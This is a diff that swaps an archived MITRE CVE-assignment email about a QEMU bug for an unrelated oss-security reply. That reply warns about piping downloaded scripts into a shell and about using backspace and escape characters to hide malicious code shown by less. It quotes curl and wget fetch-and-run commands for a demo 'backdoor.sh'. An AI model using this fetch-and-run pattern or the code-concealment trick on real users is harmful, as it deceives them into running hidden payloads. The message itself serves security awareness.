@@ -1,55 +1,82 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/30/1
-Message-Id: <20160130011323.7B7FD3AE072@smtpvbsrv1.mitre.org>
-Date: Fri, 29 Jan 2016 20:13:23 -0500 (EST)
-From: cve-assign@...re.org
-To: ppandit@...hat.com
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, zuozhi.fzz@...baba-inc.com
-Subject: Re: CVE request Qemu: ide: ahci null pointer dereference when using FIS CLB engines
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/21/9
+Message-ID: <20160421194559.GA3946@jwilk.net>
+Date: Thu, 21 Apr 2016 21:45:59 +0200
+From: Jakub Wilk <jwilk@...lk.net>
+To: oss-security@...ts.openwall.com
+Subject: Re: s/party/hack like it's 1999
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
-
-> Qemu emulator built with an IDE AHCI emulation support is vulnerable to a null
-> pointer dereference flaw. It occurs while unmapping the Frame Information
-> Structure(FIS) & Command List Block(CLB) entries.
+* up201407890@...nos.dcc.fc.up.pt, 2015-09-17, 18:03:
+>$ curl 127.0.0.1/backdoor.sh
+>#!/bin/bash
+>echo doing something very nice!
 >
-> A privileged user inside guest could use this flaw to crash the Qemu process
-> instance resulting in DoS.
+>$ wget -qO - 127.0.0.1/backdoor.sh
+>#!/bin/bash
+>echo doing something very nice!
 >
-> https://lists.gnu.org/archive/html/qemu-devel/2016-01/msg05742.html
-> https://bugzilla.redhat.com/show_bug.cgi?id=1302057
+>
+>But if we pipe it into a shell...
+>
+>
+>$ curl -s 127.0.0.1/backdoor.sh|sh
+>doing something evil!
+>
+>$ wget -qO - 127.0.0.1/backdoor.sh|sh
+>doing something evil!
+>
+>
+>You might be thinking "If I opened that in my browser, I would detect 
+>it being malicious!"
+>Well, think again...
+>One can have all sorts of fun with user-agents, something that can 
+>easily come to mind is verifying if the user-agent is from curl or 
+>wget,
 
->> ide: ahci: add check before calling dma_memo
+...or this:
+https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/
 
->> address_space_map() returns NULL because 'bounce.buffer' is in use
+>'less' doesn't interpret escape sequences unless the -r switch is used, 
+>so stop aliasing it to 'less -r' just because there's no colored 
+>output.
 
-Use CVE-2016-2197.
+As somebody else noted, it should be s/doesn't interpret/neutralizes/ or 
+something. But that doesn't mean you should feel safe if you don't use 
+-r.
 
-This is not yet available at
-http://git.qemu.org/?p=qemu.git;a=history;f=hw/ide/ahci.c but
-that may be an expected place for a later update.
+For example, when git automatically spawns a pager, it puts R in the 
+LESS environment variable. (That would be fine if git escaped \033 
+before passing them to the pager, but it doesn't. Oddly, it does seem to 
+escape other control characters.) Now, -R is less convenient than -r for 
+hiding malicious code, but you could still set foreground and background 
+to black in hope that the victim's terminal background is also black.
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+But even without -r or -R, one can use backspace characters to hide evil 
+payload:
 
-iQIcBAEBCAAGBQJWrAyZAAoJEL54rhJi8gl54p0QAK4MPiZJk06Dm60yZcoDkz2k
-AOnEE+vnHrYgD0pv3gNrtN5r7m3Aqo0FnDv9O+MlRy35ZouAnp5M5FcMhLCSnxyi
-5py9FNW0VMOSz45y7oXFv50SOtbHO63uRf5ZUGc1Sbb2gWFVZuYdZMy1MByZ38lO
-BEwBmrhDHHa7v1VEwA0avC+ur4H8IZeVv0o16IdgrkbJ3HMOq+mdH8wZVhiiQykK
-sR7K4u/iGk3ZV1Jn9Cf9YGtxArFQCYeN58kNQ9SyH5oe2ZnoGnub3ovB7V00ReiU
-E+cbPRTwByJyIE/5kOhDHUOV32CnRmkNwWW0g4ZiaROtsQY95gC6+VzASzrAahsY
-igG+FuW2YV98opbtqegVixPHeYN5SJu/DIQKJEolPqpNeGs8tNYrhmtShgm95ZJc
-K4LrPuNwmg4ZNCFuAGQB6bKzvddh9zutj9Eui5xeuzWd9cXWCJV8F2RHAVtYZZKM
-T2WedId8Bu5OstqMCPRQjFMnlMPiajqSdrot0hUAtLds1/EI+iWu0mXaq1fmTxY4
-qOtz7GzFWx5xQ+ZRlZj6W3J9dsN74w6xG94vle/bWYLxp646oYBfyMk2nBI4hW3m
-XjoUe09njgFRNFDzFJK9uj//qirsPRN2c14RamCN8y65bFKQ4rpopjW26VQwBNJJ
-IpC8cX/RD1LvEnWkxF8L
-=Huqy
------END PGP SIGNATURE-----
+| $ less -FX hello.c
+| #include <stdio.h>
+| #include <stdlib.h>
+|
+| int main(int argc, char **argv)
+| {
+|         /* Copyright 2015-2016 Jakub Wilk */
+|         printf("Hello world!\n");
+|         return 0;
+| }
+|
+| $ gcc -Wall hello.c -o hello && ./hello
+|  ________
+| < ^H^H^H >
+|  --------
+|         \   ^__^
+|          \  (oo)\_______
+|             (__)\       )\/\
+|                 ||----w |
+|                 ||     ||
+
+-- 
+Jakub Wilk
+
+View attachment "hello.c" of type "text/x-csrc" (229 bytes)
